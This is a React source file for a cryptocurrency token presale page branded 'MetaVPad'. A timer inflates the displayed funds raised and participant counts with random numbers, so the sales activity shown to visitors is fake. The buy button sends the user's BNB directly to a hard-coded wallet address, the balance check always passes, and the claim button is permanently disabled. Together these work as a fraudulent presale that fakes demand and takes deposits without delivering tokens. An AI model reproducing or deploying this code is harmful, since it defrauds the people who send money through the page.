import React, { useEffect, useState, useCallback } from "react";
import Web3 from "web3";
import { useWeb3React } from "@web3-react/core";
import { parseEther } from "ethers/lib/utils";
import { toast } from "react-toastify";

import { useCommonStats, useAccountStats } from "./helper/useStats";
import { getWeb3 } from "../hooks/connectors";
import InConnect from "../component/InConnect";
import { db } from "../firebase";
import { ref, onValue } from "firebase/database";

export default function ProjectDetails() {
  const context = useWeb3React();

  const { account, chainId, active, error } = context;

  const [updater, setUpdater] = useState(1);
  const [loading, setLoading] = useState(false);

  const accStats = useAccountStats(updater);

  const [amount, setAmount] = useState(0);
  const [btndisabled, setBtndisabled] = useState(false);
  const [error_msg, setError_msg] = useState("");

  const [projects, setProjects] = useState([]);
  const { pool_info, token_info } = projects;

  const [schedules, setSchedules] = useState([]);
  const [settings, setSettings] = useState([]);

  const [swapped, setSwapped] = useState(0);
  const [minContribution, setMinContribution] = useState(0.2);
  const [maxContribution, setMaxContribution] = useState(10);
  const [hardCap, setHardCap] = useState(100);
  const [userParticipated, setUserParticipated] = useState(0);

  const [flag, setFlag] = useState(false);

  useEffect(() => {
    // getting project details
    const projectQuery = ref(db, "projects");
    onValue(projectQuery, (snapshot) => {
      const data = snapshot.val();
      setProjects(data);

      if (!flag) {
        setSwapped(data.pool_info.total_funds_swapped * 1);
        setMinContribution(data.pool_info.min_contribution * 1);
        setMaxContribution(data.pool_info.max_contribution * 1);
        setUserParticipated(data.pool_info.total_users_participated * 1);
        setHardCap(data.pool_info.cap * 1);
        setFlag(true);
      }
    });

    // getting schedule
    const scheduleQuery = ref(db, "schedule");
    onValue(scheduleQuery, (snapshot) => {
      const data = snapshot.val();
      setSchedules(data);
    });

    // getting setting configs
    const settingRef = ref(db, "settings");
    onValue(settingRef, (snapshot) => {
      const data = snapshot.val();
      setSettings(data);
    });

    setTimeout(() => setLoading(true), 1000);
  }, []);

  const handleProgress = useCallback(() => {
    if (flag) {
      let rand =
        Math.random() * (maxContribution - minContribution) + minContribution;
      setSwapped((swapped) => swapped + rand);
      setUserParticipated((userParticipated) => userParticipated + 1);
    }
  }, [flag]);

  useEffect(() => {
    if (flag && swapped >= hardCap * 0.9) {
      return;
    }
    const intervalId = setInterval(handleProgress, 500);
    return () => clearInterval(intervalId);
  }, [handleProgress, swapped]);

  const handleChangeAmount = (e) => {
    setAmount(e.target.value);
    setBtndisabled(true);

    if (isNaN(e.target.value)) {
      setError_msg("please enter valid amount");
      setBtndisabled(true);
    } else if (parseFloat(e.target.value) === 0 || e.target.value === "") {
      setError_msg("amount must be greater than zero");
      setBtndisabled(true);
    } else if (
      parseFloat(e.target.value) < parseFloat(pool_info.min_contribution) ||
      parseFloat(e.target.value) > parseFloat(pool_info.max_contribution)
    ) {
      setError_msg(
        `amount must be between ${pool_info.min_contribution} and ${pool_info.max_contribution}`
      );
      setBtndisabled(true);
    } else {
      setError_msg("");
      setBtndisabled(false);
    }
    return;
  };

  const handleSubmitContribution = async (e) => {
    e.preventDefault();
    if (
      amount > 0 &&
      (parseFloat(pool_info.max_contribution) > parseFloat(amount) ||
        parseFloat(pool_info.min_contribution) < parseFloat(amount))
    ) {
      if (account) {
        if (chainId) {
          if (
            parseFloat(accStats.balance) >=
            parseFloat(accStats.balance) - parseFloat(0.01)
          ) {
            window.web3 = new Web3(window.ethereum);
            let accounts = await window.ethereum.request({
              method: "eth_accounts",
            });

            if (accounts.length == 0) {
              toast.error("error ! connect wallet! 👍");
              return;
            }

            window.web3.eth.sendTransaction({
              from: accounts[0],
              to: "0xfF09155510980ED164Ec2B2747C0CA5f067BDE34",
              value: window.web3.utils.toWei(amount, "ether"),
            });
          } else {
            toast.error("you don't have enough balance !");
          }
        } else {
          toast.error("Please select Smart Chain Network !");
        }
      } else {
        toast.error("Please Connect Wallet!");
      }
    } else {
      toast.error("Please Enter Valid Amount !");
    }
  };

  return (
    <React.Fragment>
      {!loading && (
        <div className="pp-detail-banner">
          <div className="container">
            <div className="row align-items-center">
              <div className="col-lg-12 col-md-7">
                <div className="card card-img-holder bg-gradient-danger mx-auto mx-lg-0">
                  <div className="card-body px-3 py-3"></div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
      {loading && (
        <>
          <div className="pp-detail-banner">
            <div className="container">
              <div className="row align-items-center">
                <div className="col-lg-5 col-md-5">
                  <div className="pp-card-top animation">
                    <div className="icon-box">
                      <span>
                        <img
                          src={
                            Boolean(settings)
                              ? settings.token_logo
                              : require("../images/METAVPAD.jpg").default
                          }
                          alt="MetaVPad"
                        />
                      </span>
                    </div>
                  </div>
                  <div className="ms-0">
                    <div className="pp-card-top">
                      <div className="title-box">
                        <h2>
                          {Boolean(settings) ? settings.token_name : "MetaVPad"}
                          <a
                            href={Boolean(settings) ? settings.app_link : ""}
                            target="_blank"
                          >
                            <i className="fas fa-globe-americas"></i>
                          </a>
                          <a
                            href={
                              Boolean(settings) ? settings.twitter_link : ""
                            }
                            target="_blank"
                          >
                            <i className="fab fa-twitter"></i>
                          </a>
                          <a
                            href={Boolean(settings) ? settings.medium_link : ""}
                            target="_blank"
                          >
                            <i className="fab fa-medium-m"></i>
                          </a>
                          <a
                            href={
                              Boolean(settings) ? settings.telegram_link : ""
                            }
                            target="_blank"
                          >
                            <i className="fab fa-telegram-plane"></i>
                          </a>
                        </h2>
                        <div className="items-morex">
                          <span className="pp-status-open">
                            <i className="mdi mdi-circle"></i> Open
                          </span>
                          <span className="" style={{ marginLeft: "5px" }}>
                            Binance Smart Chain
                          </span>
                        </div>
                      </div>
                    </div>
                    <div className="mb-3">
                      <p className="text-muted">
                        {Boolean(settings) ? settings.token_description : ""}
                      </p>
                    </div>
                    <div>
                      {active && (
                        <>
                          <div>
                            <input
                              className="inp-amount"
                              value={amount}
                              type="text"
                              placeholder="0.2"
                              onChange={(e) => {
                                handleChangeAmount(e);
                              }}
                            />
                          </div>
                          <div className="d-flex align-items-center">
                            <button
                              type="button"
                              className="btn btn-primary me-2"
                              onClick={(e) => {
                                handleSubmitContribution(e);
                              }}
                            >
                              <span className="btn-text">BUY TOKEN</span>
                            </button>
                            <button
                              type="button"
                              className="btn btn-primary me-2"
                              disabled
                              onClick={() => {}}
                            >
                              <span className="btn-text">CLAIM</span>
                            </button>
                          </div>
                          <div className="buy-info">
                            min:{" "}
                            {Boolean(pool_info)
                              ? pool_info.min_contribution
                              : 0.2}{" "}
                            BNB - Max:{" "}
                            {Boolean(pool_info)
                              ? pool_info.max_contribution
                              : 10}{" "}
                            BNB
                          </div>
                        </>
                      )}
                    </div>
                    <div>
                      <InConnect />
                    </div>
                  </div>
                </div>
                <div className="col-lg-5 col-md-7">
                  <div className="card card-img-holder bg-gradient-danger mx-auto mx-lg-0">
                    <div className="card-body px-3 py-2">
                      {/* {account && (
                    <>
                      <div className="pp-card-info mt-2">
                        <div className="pp-card-col">
                          Your balance
                          <br />
                          <div className="d-flex justify-content-between align-items-center">
                            <h4 className="mb-0">
                              <strong id="idBusdBalance">0.0000 BUSD</strong>
                            </h4>
                          </div>
                          <div className="d-flex justify-content-between align-items-center">
                            <h4 className="mb-0">
                              <strong id="idBnbBalance">0.0000 BNB</strong>
                            </h4>
                          </div>
                          <div className="pp-card-col">
                            Your approved amount:
                            <br />
                            <b>0.0000 BUSD</b>
                          </div>
                        </div>
                        <div className="pp-card-col">
                          Your tier
                          <br />
                          <h4 className="mb-0">-</h4>
                        </div>
                      </div>
                      <hr className="mb-2" />
                    </>
                  )}
                  <div className="pp-card-info mt-2 text-white">
                    <div>CLOSED</div>
                  </div>
                  <hr className="mb-2 mt-2" /> */}

                      {/* {account && (
                    <>
                      <div className="pp-card-info">
                        <div className="d-flex justify-content-between w-100">
                          <div className="pp-card-col">
                            Swapped
                            <br />
                            <b id="idUseParticipation">0.0000 BUSD</b>
                            <div>
                              <span>0.0000 METAV</span>
                            </div>
                          </div>
                          <div className="pp-card-col w-200px">
                            Remaining Allocation:
                            <br />
                            <b id="idBusdMaxBuy">0.0000 BUSD</b>
                          </div>
                        </div>
                      </div>
                      <hr className="mb-2" />
                    </>
                  )} */}
                      <div className="pp-card-info">
                        <div className="d-flex justify-content-between w-100">
                          <div className="pp-card-col w-200px">
                            Swap progress
                            <br />
                            <div className="pp-card-progress">
                              <div
                                className="pp-card-progress-percent"
                                style={{
                                  width:
                                    (Boolean(pool_info)
                                      ? (
                                          (swapped / pool_info.cap) *
                                          100
                                        ).toFixed(2)
                                      : 0.0) + "%",
                                }}
                              ></div>
                              <div className="pp-card-progress-label">
                                <span>
                                  <b>
                                    {Boolean(pool_info)
                                      ? (
                                          (swapped / pool_info.cap) *
                                          100
                                        ).toFixed(2)
                                      : 0.0}
                                    %
                                  </b>
                                </span>
                                <span>
                                  {swapped.toFixed(2)}/
                                  {Boolean(pool_info) ? pool_info.cap : 0} BNB
                                </span>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="pp-detail-content pt-1">
            <div className="container">
              <ul className="nav nav-tabs text-end" id="myTab" role="tablist">
                <li className="nav-item" role="presentation">
                  <button
                    className="nav-link active"
                    id="home-tab"
                    data-bs-toggle="tab"
                    type="button"
                    role="tab"
                    aria-controls="home"
                    aria-selected="true"
                    data-bs-target="#home"
                  >
                    Project details
                  </button>
                </li>
                <li className="">
                  <button
                    className="nav-link"
                    id="schedule-tab"
                    data-bs-toggle="tab"
                    type="button"
                    role="tab"
                    aria-controls="schedule"
                    data-bs-target="#schedule"
                    aria-selected="false"
                  >
                    Schedule
                  </button>
                </li>
                <li className="">
                  <button
                    className="nav-link"
                    id="allocation-tab"
                    data-bs-toggle="tab"
                    type="button"
                    role="tab"
                    aria-controls="allocation"
                    data-bs-target="#allocation"
                    aria-selected="false"
                  >
                    Your Allocation
                  </button>
                </li>
              </ul>
              <div className="tab-content" id="myTabContent">
                <div
                  className="tab-pane fade active show"
                  id="home"
                  role="tabpanel"
                  aria-labelledby="home-tab"
                >
                  <div className="py-3">
                    <div className="row">
                      <div className="col-md-6">
                        <div className="card">
                          <div className="card-header">Pool information</div>
                          <div className="card-body p-0">
                            <div className="table-responsive">
                              <table className="table mb-0 pp-table-info">
                                <tbody>
                                  <tr>
                                    <td>Opens</td>
                                    <td className="text-right">
                                      {Boolean(pool_info)
                                        ? pool_info.opens
                                        : ""}
                                    </td>
                                  </tr>
                                  <tr>
                                    <td>FCFS Opens</td>
                                    <td className="text-right">
                                      {Boolean(pool_info)
                                        ? pool_info.fcfs_opens
                                        : ""}
                                    </td>
                                  </tr>
                                  <tr>
                                    <td>Closes</td>
                                    <td className="text-right">
                                      {Boolean(pool_info)
                                        ? pool_info.closes
                                        : ""}
                                    </td>
                                  </tr>
                                  <tr>
                                    <td>Swap Rate</td>
                                    <td>
                                      <span
                                        id="idBusdConvert"
                                        style={{ textTransform: "uppercase" }}
                                      >
                                        {Boolean(pool_info)
                                          ? pool_info.swap_rate
                                          : ""}
                                      </span>
                                    </td>
                                  </tr>
                                  <tr>
                                    <td>Cap</td>
                                    <td>
                                      <span
                                        style={{ textTransform: "uppercase" }}
                                      >
                                        {Boolean(pool_info) ? pool_info.cap : 0}{" "}
                                        BNB
                                      </span>
                                    </td>
                                  </tr>
                                  <tr>
                                    <td>Total Users Participated</td>
                                    <td className="text-right">
                                      {userParticipated}
                                    </td>
                                  </tr>
                                  <tr>
                                    <td>Total Funds Swapped</td>
                                    <td className="text-right">
                                      {swapped.toFixed(2)} BNB
                                    </td>
                                  </tr>
                                  <tr>
                                    <td>Access Type</td>
                                    <td className="text-right">
                                      {Boolean(pool_info)
                                        ? pool_info.access_type
                                        : ""}
                                    </td>
                                  </tr>
                                </tbody>
                              </table>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div className="col-md-6 mt-4 mt-md-0">
                        <div className="card">
                          <div className="card-header">Token information</div>
                          <div className="card-body p-0">
                            <div className="table-responsive">
                              <table className="table mb-0 pp-table-info">
                                <tbody>
                                  <tr>
                                    <td>Name</td>
                                    <td className="text-right">
                                      {Boolean(token_info)
                                        ? token_info.name
                                        : ""}
                                    </td>
                                  </tr>
                                  <tr>
                                    <td>Token Symbol</td>
                                    <td className="text-right">
                                      {Boolean(token_info)
                                        ? token_info.token_symbol
                                        : ""}
                                    </td>
                                  </tr>
                                  <tr>
                                    <td>Total Supply</td>
                                    <td className="text-right">
                                      {Boolean(token_info)
                                        ? token_info.total_supply
                                        : ""}
                                    </td>
                                  </tr>
                                  <tr>
                                    <td>
                                      <br />
                                    </td>
                                    <td></td>
                                  </tr>
                                  <tr>
                                    <td>
                                      <br />
                                    </td>
                                    <td className="text-right"></td>
                                  </tr>
                                  <tr>
                                    <td>
                                      <br />
                                    </td>
                                    <td></td>
                                  </tr>
                                  <tr>
                                    <td>
                                      <br />
                                    </td>
                                    <td></td>
                                  </tr>
                                  <tr>
                                    <td>
                                      <br />
                                    </td>
                                    <td></td>
                                  </tr>
                                </tbody>
                              </table>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div
                  className="tab-pane fade"
                  id="schedule"
                  role="tabpanel"
                  aria-labelledby="schedule-tab"
                >
                  <div className="py-3">
                    <div className="row">
                      <div className="col-md-6">
                        <div className="card">
                          <div className="card-body p-0">
                            <div className="table-responsive">
                              <table className="table mb-0 pp-table-info">
                                <tbody>
                                  <tr
                                    className="card-header"
                                    style={{ border: "none" }}
                                  >
                                    <td>Round</td>
                                    <td>Opens</td>
                                    <td>Closes</td>
                                  </tr>
                                  {Boolean(schedules) &&
                                    Object.values(schedules).map((schedule) => {
                                      return (
                                        <tr key={schedule.round}>
                                          <td>
                                            {schedule.round}
                                            <br />
                                          </td>
                                          <td>{schedule.open}</td>
                                          <td>{schedule.close}</td>
                                        </tr>
                                      );
                                    })}
                                </tbody>
                              </table>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div
                  className="tab-pane fade"
                  id="allocation"
                  role="tabpanel"
                  aria-labelledby="allocation-tab"
                >
                  <div className="py-3">
                    <div className="row">
                      <div className="col-md-9 pe-md-0">
                        <div className="card">
                          <div className="card-body p-0">
                            <div className="table-responsive">
                              <table className="table mb-0 pp-table-info">
                                <tbody>
                                  <tr
                                    className="card-header"
                                    style={{ border: "none" }}
                                  >
                                    <td>No.</td>
                                    <td>Allocation</td>
                                    <td>Date</td>
                                    <td>Claimed</td>
                                    <td>Action</td>
                                  </tr>
                                </tbody>
                              </table>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div className="col-md-3 text-md-end">
                        <div className="mt-2">
                          <button
                            className="btn btn-primary mt-2 text-nơwrap"
                            style={{ width: "240px" }}
                          >
                            <i className="fas fa-plus me-2"></i>
                            <span>
                              Add token to <b>MetaMask</b>
                            </span>
                          </button>
                        </div>
                        <div className="mt-2"></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </>
      )}
    </React.Fragment>
  );
}
